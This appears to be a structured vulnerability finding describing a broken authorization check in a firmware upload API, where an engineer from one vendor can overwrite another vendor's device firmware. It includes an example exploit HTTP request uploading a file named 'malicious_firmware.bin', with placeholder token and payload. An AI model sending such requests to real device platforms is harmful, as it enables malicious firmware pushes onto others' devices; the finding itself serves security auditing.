diagnosis: The Busboy file streaming handler writes a new firmware binary directly to disk for modelId. While verifyEngineerAuth verifies that the caller has an engineer role, it does not confirm that the modelId is assigned to the engineer's vendor manufacturer account. An engineer from Vendor A can overwrite firmware images for devices manufactured by Vendor B.
exploit_request:
POST /api/devices/models/MOD-SECURITY-CAM-PRO/firmware HTTP/1.1
Host: ota.deviceplatform.net
Authorization: Bearer <engineer_jwt>
Content-Type: multipart/form-data; boundary=----BusboyBoundary123

------BusboyBoundary123
Content-Disposition: form-data; name="firmware"; filename="malicious_firmware.bin"
Content-Type: application/octet-stream

<binary_payload>
------BusboyBoundary123--
